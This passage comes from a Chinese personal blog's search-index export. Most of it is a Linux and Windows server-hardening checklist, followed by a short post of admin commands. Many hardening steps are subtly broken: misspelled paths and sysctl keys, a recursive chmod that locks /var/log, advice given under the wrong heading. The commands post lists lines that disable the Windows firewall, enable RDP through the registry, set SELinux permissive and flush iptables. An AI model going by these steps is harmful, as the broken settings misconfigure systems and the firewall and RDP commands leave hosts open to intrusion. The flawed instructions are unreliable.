<h6 id="修改umask值"><a href="#修改umask值" class="headerlink" title="修改umask值"></a>修改umask值</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改启动脚本文件</span></span><br><span class="line">/etc/profile</span><br><span class="line">/etc/csh.login</span><br><span class="line">/etc/csh.cshrc</span><br><span class="line">/etc/bashrc</span><br><span class="line"><span class="comment">#在文件末尾加入umask值 反码</span></span><br><span class="line"><span class="built_in">umask</span> 027   <span class="comment"># 权限750</span></span><br></pre></td></tr></table></figure>

<h6 id="限制硬件资源"><a href="#限制硬件资源" class="headerlink" title="限制硬件资源"></a>限制硬件资源</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改限制文件  减缓ddos带来的危害  </span></span><br><span class="line"><span class="comment">#加入以下内容</span></span><br><span class="line">vi /etc/security/limits.conf</span><br><span class="line">	soft core  0</span><br><span class="line">	hard core  0</span><br><span class="line">	hard rss   5000   <span class="comment">#限制5m的内存</span></span><br><span class="line">	hard <span class="built_in">nproc</span> 20     <span class="comment">#限制20个进程</span></span><br><span class="line">	</span><br></pre></td></tr></table></figure>



<p>在文件末尾加入信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">session required /lib64/security/pam_limit.so</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>日常收集进程数使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps aux | grep httpd | wc -l</span><br></pre></td></tr></table></figure>

<h6 id="启用日志功能，使用日志服务器"><a href="#启用日志功能，使用日志服务器" class="headerlink" title="启用日志功能，使用日志服务器"></a>启用日志功能，使用日志服务器</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#日志接收方</span></span><br><span class="line"><span class="comment"># 修改应用服务器日志配置文件</span></span><br><span class="line">vi /etc/rsyslog.conf</span><br><span class="line">	<span class="comment">#开启接收日志功能</span></span><br><span class="line">	<span class="variable">$ModLoad</span> imudp</span><br><span class="line">	<span class="variable">$UDPServerRun</span> 514</span><br><span class="line">	<span class="variable">$template</span> Remote,<span class="string">&quot;/var/1og/%<span class="variable">$YEAR</span>%-%<span class="variable">$MONTH</span>%-%<span class="variable">$DAY</span>%/%fromhost-ip%.log&quot;</span> <span class="comment">#远程日志路径</span></span><br><span class="line">	:formhost-ip,isequal,<span class="string">&quot;127.0.0.1&quot;</span> ?Remote <span class="comment">#本地日志不存储远程文件 </span></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line">systemctl restart rsyslog</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#日志发送方</span></span><br><span class="line"><span class="comment"># 确认关键日志审计是否存在</span></span><br><span class="line">*.info;mail.none;authpriv.none;cron.none   /var/log/messages</span><br><span class="line">authpriv.*                                 /var/log/secure</span><br><span class="line"><span class="comment">#添加两行转发日志信息</span></span><br><span class="line">*.info;mail.none;authpriv.none;cron.none   @192.168.2.1</span><br><span class="line">authpriv.*                                 @192.168.2.1</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">systemctl restart rsyslog</span><br><span class="line"><span class="comment">#设置权限为640</span></span><br><span class="line"><span class="built_in">ls</span> -al /var/log/</span><br><span class="line"><span class="built_in">chmod</span> -R 640 /var/log</span><br></pre></td></tr></table></figure>

<h6 id="设置关键文件底层属性"><a href="#设置关键文件底层属性" class="headerlink" title="设置关键文件底层属性"></a>设置关键文件底层属性</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改关键文件和日志的底层属性，降低篡改风险</span></span><br><span class="line">chattr +a /var/log/message</span><br><span class="line">chattr +i /var/log/message.*</span><br><span class="line">chattr +i /var/etc/shadow</span><br><span class="line">chattr +i /var/etc/passwd</span><br><span class="line">chattr +i /var/etc/group</span><br><span class="line"><span class="comment"># 不只限于上述文件，可用lsattr查看更改结果</span></span><br></pre></td></tr></table></figure>

<h6 id="对用户使用ls-rm设置别名"><a href="#对用户使用ls-rm设置别名" class="headerlink" title="对用户使用ls,rm设置别名"></a>对用户使用ls,rm设置别名</h6><p>目的，让ls随时看清文件属性</p>
<p>让rm需要确认后删除目标实施方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改当前用户的登录启动脚本</span></span><br><span class="line">vi ~/.bashrc</span><br><span class="line">	<span class="built_in">alias</span>  <span class="built_in">ls</span>=<span class="string">&quot;ls -alh&quot;</span></span><br><span class="line">	<span class="built_in">alias</span>  <span class="built_in">rm</span>=<span class="string">&quot;rm-i&quot;</span></span><br></pre></td></tr></table></figure>

<h6 id="对开放目录设置粘滞键"><a href="#对开放目录设置粘滞键" class="headerlink" title="对开放目录设置粘滞键"></a>对开放目录设置粘滞键</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 目的，允许小规模开放目录，用户作为暂存目录使用</span><br><span class="line">chmod +t /tmp/</span><br></pre></td></tr></table></figure>



<h5 id="通讯协议"><a href="#通讯协议" class="headerlink" title="通讯协议"></a>通讯协议</h5><h6 id="使用加密的远程管理ssh"><a href="#使用加密的远程管理ssh" class="headerlink" title="使用加密的远程管理ssh"></a>使用加密的远程管理ssh</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改配置文件</span></span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">	PermitRootLogin   no</span><br><span class="line">	Port              20202</span><br><span class="line">	Protocol          2</span><br><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>

<h6 id="设置访问控制列表"><a href="#设置访问控制列表" class="headerlink" title="设置访问控制列表"></a>设置访问控制列表</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改拒绝策略 </span></span><br><span class="line">vi /etc/hosts.deny</span><br><span class="line">	ALL:ALL</span><br><span class="line"><span class="comment"># 修改允许策略</span></span><br><span class="line">vi /etc/hosts.allow</span><br><span class="line">	sshd: &lt;来访者IP地址&gt;</span><br></pre></td></tr></table></figure>

<h6 id="不响应ICMP请求"><a href="#不响应ICMP请求" class="headerlink" title="不响应ICMP请求"></a>不响应ICMP请求</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改网络策略布尔值</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br></pre></td></tr></table></figure>

<h6 id="禁止处理无源路由"><a href="#禁止处理无源路由" class="headerlink" title="禁止处理无源路由"></a>禁止处理无源路由</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止被无源路由抓包  防arp攻击</span></span><br><span class="line"><span class="comment"># 检查是否开启了路由功能</span></span><br><span class="line">sysctl -n net.ipv4.conf.all.accept_source_route</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/net/ipv4/conf/all/accept_source_route</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h6 id="打开syn队列-syn-cookie"><a href="#打开syn队列-syn-cookie" class="headerlink" title="打开syn队列  syn cookie"></a>打开syn队列  syn cookie</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 缓解syn flood攻击  syn洪水</span><br><span class="line">vi /etc/sysctl.conf</span><br><span class="line">	net.ipv4.tcp_syncookies = 1</span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure>

<h6 id="防御syn-flood攻击优化"><a href="#防御syn-flood攻击优化" class="headerlink" title="防御syn flood攻击优化"></a>防御syn flood攻击优化</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 修改半连接上限，缓解syn flood攻击</span></span><br><span class="line"><span class="comment"># 查询当前半连接上限</span></span><br><span class="line">sysctl net.ipv4.tcp_max_syn_backlog</span><br><span class="line"><span class="comment"># 修改半连接上限</span></span><br><span class="line">sysctl -w net.ipv4.tcp_max_synn_backlog =<span class="string">&quot;2048&quot;</span></span><br></pre></td></tr></table></figure>

<p>FTP使用黑白名单限制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止非法账户访问ftp</span></span><br><span class="line"><span class="comment"># 检查黑名单文件是否包括高危账户</span></span><br><span class="line">/etc/ftpusers</span><br><span class="line">root daemon bin sys adm lp uucp nuucp listen nobody noaccess nobody4</span><br><span class="line"><span class="comment"># 使用白名单文件</span></span><br><span class="line">/etc/user_list</span><br><span class="line">	userlist_deny=NO</span><br><span class="line">	userlist_enable=YES</span><br></pre></td></tr></table></figure>

<h6 id="设置FTP上传的文件权限"><a href="#设置FTP上传的文件权限" class="headerlink" title="设置FTP上传的文件权限"></a>设置FTP上传的文件权限</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止被上传执行脚本</span></span><br><span class="line"><span class="comment"># 检查主配置文件/etc/vsftpd.conf是否存在如下内容</span></span><br><span class="line">	write_enable=YES</span><br><span class="line">	local_umask=022</span><br><span class="line">	anon_umask=022</span><br></pre></td></tr></table></figure>

<h6 id="检查账户目录中是否存在高危文件-netrc、-rhosts"><a href="#检查账户目录中是否存在高危文件-netrc、-rhosts" class="headerlink" title="检查账户目录中是否存在高危文件.netrc、.rhosts"></a>检查账户目录中是否存在高危文件.netrc、.rhosts</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止被使用远程登录漏洞</span></span><br><span class="line"><span class="comment"># 检查账户home目录中是否存在远程主机文件</span></span><br><span class="line"><span class="keyword">for</span> DIR <span class="keyword">in</span> <span class="string">&#x27;cut -d&quot;:&quot; -f6 /etc/passwd&#x27;</span>; <span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> [ -e <span class="variable">$DIR</span>/.netrc ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$DIR</span>/.netrc&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment"># 无返回值则表示正常</span></span><br></pre></td></tr></table></figure>

<h6 id="FTP设置banner信息"><a href="#FTP设置banner信息" class="headerlink" title="FTP设置banner信息"></a>FTP设置banner信息</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止泄露服务信息</span></span><br><span class="line">/etc/vsftpd.conf <span class="comment"># 是否存在如下内容  有的话删除掉</span></span><br><span class="line">	ftpd_banner=<span class="string">&quot;Authorized users only. All activity may be monitored and reported.&quot;</span></span><br></pre></td></tr></table></figure>

<p>配置可信任的NTP服务器，并确保服务开启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 保持时间同步，防止某些服务错误</span></span><br><span class="line"><span class="comment"># 检查主配置文件/etc/ntp.conf是否存在如下内容</span></span><br><span class="line">	server X.X.X.X</span><br><span class="line"><span class="comment"># 确保服务被启用</span></span><br><span class="line">systemctl <span class="built_in">enable</span> ntpd</span><br><span class="line">systemctl status ntpd</span><br></pre></td></tr></table></figure>

<h6 id="固化常用DNS解析"><a href="#固化常用DNS解析" class="headerlink" title="固化常用DNS解析"></a>固化常用DNS解析</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改hosts文件</span></span><br><span class="line">vi /etc/hosts</span><br><span class="line">	61.59.123.22 www.baidu.com</span><br></pre></td></tr></table></figure>

<h6 id="关闭telnet"><a href="#关闭telnet" class="headerlink" title="关闭telnet"></a>关闭telnet</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 降低被抓包后获取系统关键信息</span></span><br><span class="line"><span class="comment"># 修改telnet配置文件</span></span><br><span class="line">vim /etc/xinetd.d/telnet</span><br><span class="line">	<span class="built_in">disable</span>=<span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<h5 id="补丁管理"><a href="#补丁管理" class="headerlink" title="补丁管理"></a>补丁管理</h5><h6 id="补丁装载"><a href="#补丁装载" class="headerlink" title="补丁装载"></a>补丁装载</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 最好去官方找rpm包，安装补丁，下载时一定要进行签名校验</span><br><span class="line">yum update</span><br><span class="line"># http://www.redhat.com/corp/support/errata</span><br><span class="line">rpm -Fvh rpm包</span><br><span class="line"># 测试环境测试完，在安装</span><br></pre></td></tr></table></figure>

<h5 id="服务进程与启动"><a href="#服务进程与启动" class="headerlink" title="服务进程与启动"></a>服务进程与启动</h5><h6 id="关闭NFS服务"><a href="#关闭NFS服务" class="headerlink" title="关闭NFS服务"></a>关闭NFS服务</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止被外挂文件系统，导致入侵</span></span><br><span class="line"><span class="comment"># 检查是否存在敏感进程</span></span><br><span class="line">ps aux | grep -E <span class="string">&quot;lockd|nfsd|statd|mountd&quot;</span></span><br><span class="line"><span class="comment"># 检查关闭NFS相关服务</span></span><br><span class="line">systemctl list-unit-files |grep nfs</span><br><span class="line">systemctl <span class="built_in">disable</span> nfs-client.target</span><br></pre></td></tr></table></figure>

<h6 id="关闭无用服务"><a href="#关闭无用服务" class="headerlink" title="关闭无用服务"></a>关闭无用服务</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭无用服务，提高系统性能，降低漏洞风险</span></span><br><span class="line"><span class="comment"># 检查有哪些自启动服务，并记录列表</span></span><br><span class="line">systemctl list-unit-files |grep <span class="built_in">enable</span></span><br><span class="line"><span class="comment"># 禁用无用服务</span></span><br><span class="line">systemctl stop &lt; 服务名&gt;</span><br><span class="line">systemctl disabled &lt;服务名&gt;</span><br></pre></td></tr></table></figure>

<h6 id="建议关闭的服务"><a href="#建议关闭的服务" class="headerlink" title="建议关闭的服务"></a>建议关闭的服务</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa | grep -E &quot;^amanda|^chargen|^chargen-udp|^cups|^cups-lpd|^daytime|^daytime-udp|^echo|^echo-udp|^eklogin|^ekrb5-telnet|^finger|^gssftp|^imapl^imaps|^ipop2|ipop3|^klogin|^krb5-telnet|^kshell|^ktalk|^ntalk|^rexec|^rlogin|^rsh|^rsync|^talk|^tcpmux-server|^telnet|^tftp|^time-dgram|^time-stream|^uucp&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="banner与自动注销"><a href="#banner与自动注销" class="headerlink" title="banner与自动注销"></a>banner与自动注销</h5><h6 id="隐藏系统提示信息"><a href="#隐藏系统提示信息" class="headerlink" title="隐藏系统提示信息"></a>隐藏系统提示信息</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看登录banner信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/issus</span><br><span class="line"><span class="comment"># 清空banner文件</span></span><br><span class="line"><span class="built_in">echo</span> &gt; /etc/issus</span><br></pre></td></tr></table></figure>

<p>设置登录超时注销</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改信息</span></span><br><span class="line">vi /etc/profile</span><br><span class="line">	HISTFILESIZE=50   <span class="comment"># 只能看50行</span></span><br><span class="line"><span class="comment"># 生效</span></span><br><span class="line">	<span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>

<h6 id="跳过grup菜单"><a href="#跳过grup菜单" class="headerlink" title="跳过grup菜单"></a>跳过grup菜单</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 防止在grup菜单对引导过程进行修改</span><br><span class="line"># 修改grup配置文件</span><br><span class="line">vi /boot/grup2/grup.cfg</span><br><span class="line"># 修改等时</span><br><span class="line">set timeout=0</span><br></pre></td></tr></table></figure>

<h6 id="关闭ctrl-alt-del重启功能"><a href="#关闭ctrl-alt-del重启功能" class="headerlink" title="关闭ctrl+alt+del重启功能"></a>关闭ctrl+alt+del重启功能</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改配置文件</span></span><br><span class="line">vi /usr/lib/systemd/system/ctrl-alt-del.target</span><br><span class="line">	<span class="comment">#注释所有内容</span></span><br></pre></td></tr></table></figure>

<h4 id="windows加固方向"><a href="#windows加固方向" class="headerlink" title="windows加固方向"></a>windows加固方向</h4><h5 id="账号管理与认证授权"><a href="#账号管理与认证授权" class="headerlink" title="账号管理与认证授权"></a>账号管理与认证授权</h5><p>按用户类型分配账户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 根据系统要求，设定不同的账户和组，管理员，数据库sa，审计用户，来宾用户</span></span><br><span class="line">打开本地用户和计算机管理器</span><br><span class="line">	打开运行，输入lusrmgr.msc</span><br><span class="line">	根据用户要求将账号加入功能组</span><br><span class="line">		右击账户-&gt; 属性-&gt;更改隶属于</span><br><span class="line">		右击功能组-&gt;属性-&gt;成员</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="清理系统无用账户"><a href="#清理系统无用账户" class="headerlink" title="清理系统无用账户"></a>清理系统无用账户</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#目的: 删除或锁定设备运行，维护等工作无关的账号，提高系统账号安全性</span></span><br><span class="line">打开本地用户和计算机管理器</span><br><span class="line">	打开运行，输入lusrmgr.msc</span><br><span class="line">删除或者锁无关账号(删除操作不可逆)</span><br><span class="line">右击账户-&gt;删除</span><br><span class="line">右击账户-&gt;属性-&gt;账户已禁用</span><br></pre></td></tr></table></figure>

<h6 id="重命名administrator-禁用guest"><a href="#重命名administrator-禁用guest" class="headerlink" title="重命名administrator,禁用guest"></a>重命名administrator,禁用guest</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 减少账户被爆破可能性，提高系统访问安全性</span></span><br><span class="line">打开本地用户和计算机管理器</span><br><span class="line">	打开运行，输入lusrmgr.msc</span><br><span class="line">为管理员administrator账户改名</span><br><span class="line">	右击administrator-&gt;重命名-&gt;属性-&gt;全名</span><br><span class="line">禁用来宾guest</span><br><span class="line">	右击guest -&gt;属性-&gt;账户已禁用</span><br></pre></td></tr></table></figure>

<h6 id="设置密码策略"><a href="#设置密码策略" class="headerlink" title="设置密码策略"></a>设置密码策略</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止弱口令出现，降低爆破的可能性</span></span><br><span class="line">打开本地安全策略</span><br><span class="line">	打开运行，输入secpol.msc</span><br><span class="line">找到密码策略</span><br><span class="line">	用户策略-&gt;密码策略</span><br><span class="line">修改默认值</span><br><span class="line">	密码必须符合复杂性要求:禁用-&gt; 启用</span><br><span class="line">	密码长度最小值: 0-&gt;8</span><br></pre></td></tr></table></figure>







]]></content>
      <tags>
        <tag>配置</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>命令</title>
    <url>/2023/06/11/%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h5 id="推送到github"><a href="#推送到github" class="headerlink" title="推送到github"></a>推送到github</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g    # generate生成</span><br><span class="line">hexo d    # deploy 推送</span><br></pre></td></tr></table></figure>



<h5 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">关闭防火墙和开启3389</span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode mode=<span class="built_in">disable</span></span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>



<p>linux</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#切换账户到admin</span></span><br><span class="line">su -l admin </span><br><span class="line"></span><br><span class="line"><span class="comment">#创建账户</span></span><br><span class="line">useradd   name  </span><br><span class="line">passwd   name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置静态网卡</span></span><br><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eno</span><br><span class="line">systemctl restart network</span><br><span class="line"><span class="comment">#关闭防火墙和临时禁用selinux安全模块</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">setenforce 0</span><br><span class="line"><span class="comment">#清空防火墙规则</span></span><br><span class="line">iptables -F</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>配置</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/manifest.json</url>
    <content><![CDATA[{"name":"string","short_name":"Junzhou","theme_color":"#49b1f5","background_color":"#49b1f5","display":"standalone","scope":"/","start_url":"/","icons":[{"src":"images/pwaicons/36.png","sizes":"36x36","type":"image/png"},{"src":"images/pwaicons/48.png","sizes":"48x48","type":"image/png"},{"src":"images/pwaicons/72.png","sizes":"72x72","type":"image/png"},{"src":"images/pwaicons/96.png","sizes":"96x96","type":"image/png"},{"src":"images/pwaicons/144.png","sizes":"144x144","type":"image/png"},{"src":"images/pwaicons/192.png","sizes":"192x192","type":"image/png"},{"src":"images/pwaicons/512.png","sizes":"512x512","type":"image/png"}],"splash_pages":null}]]></content>
  </entry>
  <entry>
    <title>categories</title>
    <url>/categories/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>这是一个标签页</title>
    <url>/tags/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>wangzhi的好朋友们</title>
    <url>/link/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
